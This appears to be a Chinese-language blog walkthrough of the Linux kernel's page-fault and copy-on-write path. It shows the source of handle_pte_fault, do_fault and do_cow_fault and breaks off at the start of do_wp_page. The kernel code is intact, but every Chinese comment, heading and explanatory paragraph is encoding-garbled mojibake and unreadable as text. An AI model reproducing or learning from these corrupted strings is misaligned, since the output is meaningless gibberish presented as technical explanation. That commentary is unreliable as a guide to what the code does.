<h4 id="handle-pte-fault"><a href="#handle-pte-fault" class="headerlink" title="handle_pte_fault"></a>handle_pte_fault</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * These routines also need to handle stuff like marking pages dirty</span><br><span class="hljs-comment"> * and/or accessed for architectures that don&#x27;t do it in hardware (most</span><br><span class="hljs-comment"> * RISC architectures).  The early dirtying is also good on the i386.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * There is also a hook called &quot;update_mmu_cache()&quot; that architectures</span><br><span class="hljs-comment"> * with external mmu caches can use to update those (ie the Sparc or</span><br><span class="hljs-comment"> * PowerPC hashed page tables that act as extended TLBs).</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * We enter with non-exclusive mmap_sem (to exclude vma changes, but allow</span><br><span class="hljs-comment"> * concurrent faults).</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * The mmap_sem may have been released depending on flags and our return value.</span><br><span class="hljs-comment"> * See filemap_fault() and __lock_page_or_retry().</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">handle_pte_fault</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> fault_env *fe)</span><br>&#123;<br>	<span class="hljs-type">pte_t</span> entry;<br><br>	<span class="hljs-keyword">if</span> (unlikely(pmd_none(*fe-&gt;pmd))) &#123;<span class="hljs-comment">//È°µË°®ÊåáÈíà‰∏∫Á©∫ÔºåË°®Á§∫Áõ∏Â∫îÁöÑÈ°µË°®È°πËøòÊú™ÂàÜÈÖç„ÄÇÂú®ËøôÁßçÊÉÖÂÜµ‰∏ãÔºåÂ∞Ü fe-&gt;pte ËÆæ‰∏∫ NULL</span><br>		<span class="hljs-comment">/*</span><br><span class="hljs-comment">		 * Leave __pte_alloc() until later: because vm_ops-&gt;fault may</span><br><span class="hljs-comment">		 * want to allocate huge page, and if we expose page table</span><br><span class="hljs-comment">		 * for an instant, it will be difficult to retract from</span><br><span class="hljs-comment">		 * concurrent faults and from rmap lookups.</span><br><span class="hljs-comment">		 */</span><br>		fe-&gt;pte = <span class="hljs-literal">NULL</span>;<br>	&#125; <span class="hljs-keyword">else</span> &#123;<br>		<span class="hljs-comment">/* See comment in pte_alloc_one_map() */</span><br>		<span class="hljs-keyword">if</span> (pmd_trans_unstable(fe-&gt;pmd) || pmd_devmap(*fe-&gt;pmd))<br>			<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>		<span class="hljs-comment">/*</span><br><span class="hljs-comment">		 * A regular pmd is established and it can&#x27;t morph into a huge</span><br><span class="hljs-comment">		 * pmd from under us anymore at this point because we hold the</span><br><span class="hljs-comment">		 * mmap_sem read mode and khugepaged takes it in write mode.</span><br><span class="hljs-comment">		 * So now it&#x27;s safe to run pte_offset_map().</span><br><span class="hljs-comment">		 */</span><br>		fe-&gt;pte = pte_offset_map(fe-&gt;pmd, fe-&gt;address);<span class="hljs-comment">//‰ΩøÁî® pte_offset_map ÂáΩÊï∞Ëé∑ÂèñÁªôÂÆöËôöÊãüÂú∞ÂùÄÁöÑÈ°µË°®È°πÊåáÈíàÔºåÂπ∂ËØªÂèñËØ•È°µË°®È°πÁöÑÂÜÖÂÆπÂà∞ entry ÂèòÈáè‰∏≠„ÄÇ</span><br><br>		entry = *fe-&gt;pte;<br><br>		<span class="hljs-comment">/*</span><br><span class="hljs-comment">		 * some architectures can have larger ptes than wordsize,</span><br><span class="hljs-comment">		 * e.g.ppc44x-defconfig has CONFIG_PTE_64BIT=y and</span><br><span class="hljs-comment">		 * CONFIG_32BIT=y, so READ_ONCE or ACCESS_ONCE cannot guarantee</span><br><span class="hljs-comment">		 * atomic accesses.  The code below just needs a consistent</span><br><span class="hljs-comment">		 * view for the ifs and we later double check anyway with the</span><br><span class="hljs-comment">		 * ptl lock held. So here a barrier will do.</span><br><span class="hljs-comment">		 */</span><br>		barrier();<br>		<span class="hljs-keyword">if</span> (pte_none(entry)) &#123;<span class="hljs-comment">//Ê£ÄÊü•È°µË°®È°πÊòØÂê¶‰∏∫Á©∫ÔºàÊåáÂêëÁöÑÁâ©ÁêÜÈ°µÊ°ÜÊòØÂê¶Â≠òÂú®ÔºâÔºåÂ¶ÇÊûú‰∏∫Á©∫ÔºåÂàôÈáäÊîæ‰πãÂâçÊò†Â∞ÑÁöÑÈ°µË°®È°πÂπ∂Â∞Ü fe-&gt;pte ËÆæ‰∏∫Á©∫„ÄÇ</span><br>			pte_unmap(fe-&gt;pte);<br>			fe-&gt;pte = <span class="hljs-literal">NULL</span>;<br>		&#125;<br>	&#125;<br><br>	<span class="hljs-keyword">if</span> (!fe-&gt;pte) &#123;<span class="hljs-comment">//Â¶ÇÊûú fe-&gt;pte ‰∏∫Á©∫ÔºåÂàôËØ¥ÊòéÈ°µÈù¢‰∏çÂ≠òÂú®ÔºåÊ†πÊçÆ VMAÔºàVirtual Memory AreaÔºâÊòØÂê¶ÂåøÂêçÊâßË°å‰∏çÂêåÁöÑÈ°µÈù¢Â§ÑÁêÜÊìç‰Ωú„ÄÇ</span><br>		<span class="hljs-keyword">if</span> (vma_is_anonymous(fe-&gt;vma))<br>			<span class="hljs-keyword">return</span> do_anonymous_page(fe);<br>		<span class="hljs-keyword">else</span><br>			<span class="hljs-keyword">return</span> do_fault(fe);<span class="hljs-comment">//ÂàÜÈÖçÁâ©ÁêÜÈ°µÊ°Ü</span><br>	&#125;<br><br>	<span class="hljs-keyword">if</span> (!pte_present(entry))<span class="hljs-comment">//Â¶ÇÊûúÈ°µÈù¢Â∑≤Áªè‰∫§Êç¢Âà∞Á£ÅÁõò‰∏äÔºåÂàôÊâßË°å‰∫§Êç¢È°µÈù¢Â§ÑÁêÜÊìç‰Ωú</span><br>		<span class="hljs-keyword">return</span> do_swap_page(fe, entry);<br><br>	<span class="hljs-keyword">if</span> (pte_protnone(entry) &amp;&amp; vma_is_accessible(fe-&gt;vma))<span class="hljs-comment">//Â¶ÇÊûúÈ°µÈù¢ÊòØ‰øùÊä§ÁöÑÔºåÂπ∂‰∏î VMA ÊòØÂèØËÆøÈóÆÁöÑÔºåÂàôÊâßË°å NUMAÔºàNon-Uniform Memory AccessÔºâÈ°µÈù¢Â§ÑÁêÜÊìç‰Ωú„ÄÇ</span><br>		<span class="hljs-keyword">return</span> do_numa_page(fe, entry);<br><br>	fe-&gt;ptl = pte_lockptr(fe-&gt;vma-&gt;vm_mm, fe-&gt;pmd);<br>	spin_lock(fe-&gt;ptl);<span class="hljs-comment">//Ëá™ÊóãÈîÅ</span><br>	<span class="hljs-keyword">if</span> (unlikely(!pte_same(*fe-&gt;pte, entry)))<br>		<span class="hljs-keyword">goto</span> unlock;<br>	<span class="hljs-keyword">if</span> (fe-&gt;flags &amp; FAULT_FLAG_WRITE) &#123;<span class="hljs-comment">//Â≠òÂú® FAULT_FLAG_WRITE Ê†áÂøó‰ΩçÔºåË°®Á§∫Áº∫È°µÂºÇÂ∏∏Áî±ÂÜôÊìç‰ΩúÂºïËµ∑</span><br>		<span class="hljs-keyword">if</span> (!pte_write(entry))<span class="hljs-comment">//ÂØπÂ∫îÁöÑÈ°µ‰∏çÂèØÂÜô</span><br>			<span class="hljs-keyword">return</span> do_wp_page(fe, entry);<span class="hljs-comment">//ËøõË°åÂÜôÊó∂Â§çÂà∂ÔºåÂ∞ÜÂÜÖÂÆπÂÜôÂÖ•Áî± do_fault()-&gt;do_cow_fault()ÂàÜÈÖçÁöÑÂÜÖÂ≠òÈ°µ‰∏≠</span><br>		entry = pte_mkdirty(entry);<br>	&#125;<br>	entry = pte_mkyoung(entry);<span class="hljs-comment">//Â∞ÜËØ•È°µ„ÄêÊ†áËÑè„Äë</span><br>	<span class="hljs-keyword">if</span> (ptep_set_access_flags(fe-&gt;vma, fe-&gt;address, fe-&gt;pte, entry,<br>				fe-&gt;flags &amp; FAULT_FLAG_WRITE)) &#123;<br>		update_mmu_cache(fe-&gt;vma, fe-&gt;address, fe-&gt;pte);<br>	&#125; <span class="hljs-keyword">else</span> &#123;<br>		<span class="hljs-comment">/*</span><br><span class="hljs-comment">		 * This is needed only for protection faults but the arch code</span><br><span class="hljs-comment">		 * is not yet telling us if this is a protection fault or not.</span><br><span class="hljs-comment">		 * This still avoids useless tlb flushes for .text page faults</span><br><span class="hljs-comment">		 * with threads.</span><br><span class="hljs-comment">		 */</span><br>		<span class="hljs-keyword">if</span> (fe-&gt;flags &amp; FAULT_FLAG_WRITE)<br>			flush_tlb_fix_spurious_fault(fe-&gt;vma, fe-&gt;address);<br>	&#125;<br>unlock:<br>	pte_unmap_unlock(fe-&gt;pte, fe-&gt;ptl);<span class="hljs-comment">//Ëß£Ëá™ÊóãÈîÅ</span><br>	<span class="hljs-keyword">return</span><br></code></pre></td></tr></table></figure>

<p>Á¨¨‰∏ÄÊ¨°Áº∫È°µÂºÇÂ∏∏ÁöÑÂ§ÑÁêÜÊµÅÁ®ãÂåÖÊã¨Ôºö</p>
<ul>
<li>Ê£ÄÊü•È°µÈù¢ÂØπÂ∫îÁöÑÈ°µË°®È°πÊòØÂê¶‰∏∫Á©∫ÔºåËã•‰∏∫Á©∫ÂàôË°®Á§∫ËØ•È°µÈù¢Êú™‰∏éÁâ©ÁêÜÈ°µÂª∫Á´ãÊò†Â∞ÑÂÖ≥Á≥ª„ÄÇ</li>
<li>Â¶ÇÊûúÈ°µË°®È°π‰∏∫Á©∫ÔºåËØ¥ÊòéÈ°µÈù¢ÂèØËÉΩÊòØËøõÁ®ãÁ¨¨‰∏ÄÊ¨°ËÆøÈóÆÔºåÈúÄË¶ÅÂàÜÈÖç‰∏Ä‰∏™Êñ∞ÁöÑÁâ©ÁêÜÈ°µÔºåÂπ∂Â∞ÜÂÜÖÂÆπÂàùÂßãÂåñ‰∏∫0„ÄÇ</li>
<li>Â¶ÇÊûúÈ°µË°®È°π‰∏ç‰∏∫Á©∫ÔºåÂèØËÉΩÊòØÈ°µÈù¢Â∑≤ÁªèË¢´Êç¢Âá∫Âà∞‰∫§Êç¢Á©∫Èó¥ÔºåÈúÄË¶ÅÂ∞ÜÂÖ∂‰∫§Êç¢ÂõûÊù•„ÄÇ</li>
</ul>
<p>Á¨¨‰∫åÊ¨°Áº∫È°µÂºÇÂ∏∏ÁöÑÂ§ÑÁêÜÊµÅÁ®ãÂåÖÊã¨Ôºö</p>
<ul>
<li>Ê£ÄÊü•È°µÈù¢ÊòØÂê¶Âú®‰∏ªÂ≠ò‰∏≠ÔºåÂ¶ÇÊûúÂú®‰∏ªÂ≠ò‰∏≠ÔºåÁªßÁª≠Â§ÑÁêÜÔºõÂ¶ÇÊûú‰∏çÂú®‰∏ªÂ≠ò‰∏≠ÔºåÂèØËÉΩÊòØÂõ†‰∏∫È°µÈù¢Ë¢´Êç¢Âá∫Âà∞‰∫§Êç¢Á©∫Èó¥ÔºåÈúÄË¶ÅÂ∞ÜÂÖ∂‰∫§Êç¢ÂõûÊù•„ÄÇ</li>
<li>Â¶ÇÊûúÈ°µÈù¢Âú®‰∏ªÂ≠ò‰∏≠ÔºåÊ£ÄÊü•Áº∫È°µÂºÇÂ∏∏ÊòØÂê¶Áî±ÂÜôÊìç‰ΩúÂºïËµ∑„ÄÇ<ul>
<li>Â¶ÇÊûúÊòØÂÜôÊìç‰ΩúÂºïËµ∑ÁöÑÁº∫È°µÂºÇÂ∏∏ÔºåÊ£ÄÊü•È°µÈù¢ÊòØÂê¶ÂèØÂÜôÔºåÂ¶ÇÊûú‰∏çÂèØÂÜôÔºåÂàôÊâßË°åÂÜôÊó∂Â§çÂà∂Êìç‰ΩúÔºõÂ¶ÇÊûúÂèØÂÜôÔºåÂàôÊ†áËÆ∞È°µÈù¢‰∏∫Â∑≤‰øÆÊîπ„ÄÇ</li>
<li>Â∞ÜÊñ∞ÂÜÖÂÆπÂÜôÂÖ•È°µË°®È°π‰∏≠„ÄÇ</li>
</ul>
</li>
</ul>
<p>Âõ†Ê≠§ÔºåÊàë‰ª¨ÂèØ‰ª•ÂæóÂá∫ÁªìËÆ∫ÔºåÂΩì‰∏Ä‰∏™ËøõÁ®ãÈ¶ñÊ¨°ËÆøÈóÆ‰∏Ä‰∏™ÂÜÖÂ≠òÈ°µÊó∂Ôºå‰ºö‰æùÊ¨°Ëß¶Âèë‰∏§Ê¨°Áº∫È°µÂºÇÂ∏∏ÔºåÁ¨¨‰∏ÄÊ¨°ÊòØ‰∏∫‰∫ÜÂª∫Á´ãÈ°µÈù¢‰∏éÁâ©ÁêÜÈ°µÁöÑÊò†Â∞ÑÂÖ≥Á≥ªÔºåÁ¨¨‰∫åÊ¨°ÊòØ‰∏∫‰∫ÜÂ§ÑÁêÜÈ°µÈù¢Âú®‰∏ªÂ≠ò‰∏≠ÁöÑÂÜôÊìç‰ΩúÂºïËµ∑ÁöÑÁº∫È°µÂºÇÂ∏∏„ÄÇ</p>
<h4 id="do-fault"><a href="#do-fault" class="headerlink" title="do_fault"></a>do_fault</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">do_fault</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> fault_env *fe)</span><br>&#123;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vm_area_struct</span> *<span class="hljs-title">vma</span> =</span> fe-&gt;vma;<span class="hljs-comment">//Ëé∑Âèñ‰∫ÜÊåáÂêëÂΩìÂâçËôöÊãüÂÜÖÂ≠òÂå∫ÂüüÔºàVirtual Memory AreaÔºåVMAÔºâÁöÑÊåáÈíà vma</span><br>	<span class="hljs-type">pgoff_t</span> pgoff = linear_page_index(vma, fe-&gt;address);<span class="hljs-comment">//ËÆ°ÁÆóÈ°µÈù¢ÂÅèÁßªÈáèÔºåËØ•Â∞ÜÁ∫øÊÄßÂú∞ÂùÄËΩ¨Êç¢‰∏∫È°µÈù¢ÂÅèÁßªÈáè</span><br><br>	<span class="hljs-comment">/* The VMA was not fully populated on mmap() or missing VM_DONTEXPAND */</span><br>	<span class="hljs-keyword">if</span> (!vma-&gt;vm_ops-&gt;fault)<span class="hljs-comment">//Ê£ÄÊü•‰∫Ü vma ÂØπË±°ÊòØÂê¶ÂÖ∑ÊúâÊúâÊïàÁöÑ fault Êìç‰Ωú„ÄÇÂ¶ÇÊûú vma ÂØπË±°‰∏≠ÁöÑ vm_ops ÁªìÊûÑ‰∏≠ÁöÑ fault ÂáΩÊï∞ÊåáÈíà‰∏∫Á©∫ÔºåËØ¥ÊòéËØ•ËôöÊãüÂÜÖÂ≠òÂå∫ÂüüÂèØËÉΩÊú™ÂÆåÂÖ®ÂàùÂßãÂåñÊàñËÄÖÁº∫Â∞ë VM_DONTEXPAND Ê†áÂøó„ÄÇÂú®ËøôÁßçÊÉÖÂÜµ‰∏ãÔºåÂáΩÊï∞ËøîÂõû VM_FAULT_SIGBUSÔºåË°®Á§∫ÂèëÁîü‰∫ÜÊÄªÁ∫øÈîôËØØ„ÄÇ</span><br>		<span class="hljs-keyword">return</span> VM_FAULT_SIGBUS;<br>	<span class="hljs-keyword">if</span> (!(fe-&gt;flags &amp; FAULT_FLAG_WRITE))<span class="hljs-comment">//Â¶ÇÊûúÈ°µÈù¢ÈîôËØØ‰∏çÊòØÂÜôÊìç‰ΩúÔºåÂàôË∞ÉÁî® do_read_fault ÂáΩÊï∞Â§ÑÁêÜËØªÂèñÊìç‰Ωú„ÄÇ</span><br>		<span class="hljs-keyword">return</span> do_read_fault(fe, pgoff);<br>	<span class="hljs-keyword">if</span> (!(vma-&gt;vm_flags &amp; VM_SHARED))<span class="hljs-comment">//Â¶ÇÊûúËôöÊãüÂÜÖÂ≠òÂå∫ÂüüÁöÑÊ†áÂøó‰∏≠‰∏çÂåÖÂê´ VM_SHARED Ê†áÂøóÔºåËØ¥ÊòéËØ•Âå∫ÂüüÊòØÁßÅÊúâÁöÑÔºåÂáΩÊï∞Ë∞ÉÁî® do_cow_fault ÂáΩÊï∞Â§ÑÁêÜÂÜôÊó∂Â§çÂà∂ÈîôËØØÔºàCopy-On-Write FaultÔºâ„ÄÇ</span><br>		<span class="hljs-keyword">return</span> do_cow_fault(fe, pgoff);<br>	<span class="hljs-keyword">return</span> do_shared_fault(fe, pgoff);<span class="hljs-comment">//ËôöÊãüÂÜÖÂ≠òÂå∫ÂüüÊòØÂÖ±‰∫´ÁöÑÔºåÂáΩÊï∞Ë∞ÉÁî® do_shared_fault ÂáΩÊï∞Â§ÑÁêÜÂÖ±‰∫´ÈîôËØØ</span><br>&#125;<br><br></code></pre></td></tr></table></figure>

<h4 id="Â§ÑÁêÜÂÜôÊó∂Â§çÂà∂ÔºàÊó†ÂÜÖÂ≠òÈ°µÔºâ-do-cow-fault"><a href="#Â§ÑÁêÜÂÜôÊó∂Â§çÂà∂ÔºàÊó†ÂÜÖÂ≠òÈ°µÔºâ-do-cow-fault" class="headerlink" title="Â§ÑÁêÜÂÜôÊó∂Â§çÂà∂ÔºàÊó†ÂÜÖÂ≠òÈ°µÔºâ: do_cow_fault()"></a>Â§ÑÁêÜÂÜôÊó∂Â§çÂà∂ÔºàÊó†ÂÜÖÂ≠òÈ°µÔºâ: do_cow_fault()</h4><p>Êú¨ÁØá‰∏ªË¶ÅÂÖ≥Ê≥®ÂÜôÊó∂Â§çÂà∂ÁöÑËøáÁ®ãÔºõ<code>COW</code>ÊµÅÁ®ãÂú®Á¨¨‰∏ÄÊ¨°ÂÜôÊó∂Ëß¶ÂèëÁº∫È°µÂºÇÂ∏∏ÊúÄÁªà‰æø‰ºöËøõÂÖ•Âà∞ <code>do_cow_fault()</code> ‰∏≠Â§ÑÁêÜ</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">do_cow_fault</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> fault_env *fe, <span class="hljs-type">pgoff_t</span> pgoff)</span><br>&#123;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vm_area_struct</span> *<span class="hljs-title">vma</span> =</span> fe-&gt;vma;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">fault_page</span>, *<span class="hljs-title">new_page</span>;</span><br>	<span class="hljs-type">void</span> *fault_entry;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mem_cgroup</span> *<span class="hljs-title">memcg</span>;</span><br>	<span class="hljs-type">int</span> ret;<br><br>	<span class="hljs-keyword">if</span> (unlikely(anon_vma_prepare(vma)))<br>		<span class="hljs-keyword">return</span> VM_FAULT_OOM;<br><br>	new_page = alloc_page_vma(GFP_HIGHUSER_MOVABLE, vma, fe-&gt;address);<span class="hljs-comment">//‰∏∫ÂΩìÂâçËøõÁ®ãÂàÜÈÖç‰∏Ä‰∏™Êñ∞ÁöÑÈ°µÈù¢</span><br>	<span class="hljs-keyword">if</span> (!new_page)<br>		<span class="hljs-keyword">return</span> VM_FAULT_OOM;<br><br>	<span class="hljs-keyword">if</span> (mem_cgroup_try_charge(new_page, vma-&gt;vm_mm, GFP_KERNEL,<span class="hljs-comment">//‰∏∫Êñ∞È°µÈù¢ÂàÜÈÖçÂÜÖÂ≠òËµÑÊ∫ê</span><br>				&amp;memcg, <span class="hljs-literal">false</span>)) &#123;<br>		put_page(new_page);<br>		<span class="hljs-keyword">return</span> VM_FAULT_OOM;<br>	&#125;<br><br>	ret = __do_fault(fe, pgoff, new_page, &amp;fault_page, &amp;fault_entry);<span class="hljs-comment">//ËØªÂèñÊñá‰ª∂ÂÜÖÂÆπÂà∞fault_page</span><br>	<span class="hljs-keyword">if</span> (unlikely(ret &amp; (VM_FAULT_ERROR | VM_FAULT_NOPAGE | VM_FAULT_RETRY)))<br>		<span class="hljs-keyword">goto</span> uncharge_out;<br><br>	<span class="hljs-keyword">if</span> (!(ret &amp; VM_FAULT_DAX_LOCKED))<br>		copy_user_highpage(new_page, fault_page, fe-&gt;address, vma);<span class="hljs-comment">//Êã∑Ë¥ùfault_pageÂÜÖÂÆπÂà∞new_page</span><br>	__SetPageUptodate(new_page);<br><br>	ret |= alloc_set_pte(fe, memcg, new_page);<span class="hljs-comment">//ËÆæÁΩÆpteÔºåÁΩÆÊç¢ËØ•ËøõÁ®ã‰∏≠ÁöÑpteË°®È°πÔºåÂØπ‰∫éÂÜôÊìç‰Ωú‰ºöÂ∞ÜËØ•È°µÊ†áËÑèÔºàËØ•ÂáΩÊï∞‰ºöË∞ÉÁî®maybe_mkwrite()ÂáΩÊï∞ÔºåÂÖ∂‰ºöË∞ÉÁî®pte_mkdirty()ÂáΩÊï∞Ê†áËÑèËØ•È°µÔºâ</span><br>	<span class="hljs-keyword">if</span> (fe-&gt;pte)<br>		pte_unmap_unlock(fe-&gt;pte, fe-&gt;ptl);<br>	<span class="hljs-keyword">if</span> (!(ret &amp; VM_FAULT_DAX_LOCKED)) &#123;<span class="hljs-comment">//ÈáäÊîæfault_page</span><br>		unlock_page(fault_page);<br>		put_page(fault_page);<br>	&#125; <span class="hljs-keyword">else</span> &#123;<br>		dax_unlock_mapping_entry(vma-&gt;vm_file-&gt;f_mapping, pgoff);<br>	&#125;<br>	<span class="hljs-keyword">if</span> (unlikely(ret &amp; (VM_FAULT_ERROR | VM_FAULT_NOPAGE | VM_FAULT_RETRY)))<br>		<span class="hljs-keyword">goto</span> uncharge_out;<br>	<span class="hljs-keyword">return</span> ret;<br>uncharge_out:<br>	mem_cgroup_cancel_charge(new_page, memcg, <span class="hljs-literal">false</span>);<br>	put_page(new_page);<br>	<span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure>

<h4 id="Â§ÑÁêÜÂÜôÊó∂Â§çÂà∂ÔºàÊúâÂÜÖÂ≠òÈ°µÔºâÔºödo-wp-page"><a href="#Â§ÑÁêÜÂÜôÊó∂Â§çÂà∂ÔºàÊúâÂÜÖÂ≠òÈ°µÔºâÔºödo-wp-page" class="headerlink" title="Â§ÑÁêÜÂÜôÊó∂Â§çÂà∂ÔºàÊúâÂÜÖÂ≠òÈ°µÔºâÔºödo_wp_page"></a>Â§ÑÁêÜÂÜôÊó∂Â§çÂà∂ÔºàÊúâÂÜÖÂ≠òÈ°µÔºâÔºödo_wp_page</h4><p>ÂΩìÈÄöËøá <code>do_fault()</code> Ëé∑ÂèñÂÜÖÂ≠òÈ°µ‰πãÂêéÔºåÁ¨¨‰∫åÊ¨°Ëß¶ÂèëÁº∫È°µÂºÇÂ∏∏Êó∂‰æø‰ºöÊúÄÁªà‰∫§Áî± <code>do_wp_page()</code> ÂáΩÊï∞Â§ÑÁêÜ</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * This routine handles present pages, when users try to write</span><br><span class="hljs-comment"> * to a shared page. It is done by copying the page to a new address</span><br><span class="hljs-comment"> * and decrementing the shared-page counter for the old page.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Note that this routine assumes that the protection checks have been</span><br><span class="hljs-comment"> * done by the caller (the low-level page fault routine in most cases).</span><br><span class="hljs-comment"> * Thus we can safely just mark it writable once we&#x27;ve done any necessary</span><br><span class="hljs-comment"> * COW.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * We also mark the page dirty at this point even though the page will</span><br><span class="hljs-comment"> * change only once the write actually happens. This avoids a few races,</span><br><span class="hljs-comment"> * and potentially makes it more efficient.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * We enter with non-exclusive mmap_sem (to exclude vma changes,</span><br><span class="hljs-comment"> * but allow concurrent faults), with pte both mapped and locked.</span><br><span class="hljs-comment"> * We return with mmap_sem still held, but pte unmapped and unlocked.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">do_wp_page</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> fault_env *fe, <span class="hljs-type">pte_t</span> orig_pte)</span><br>	__<span 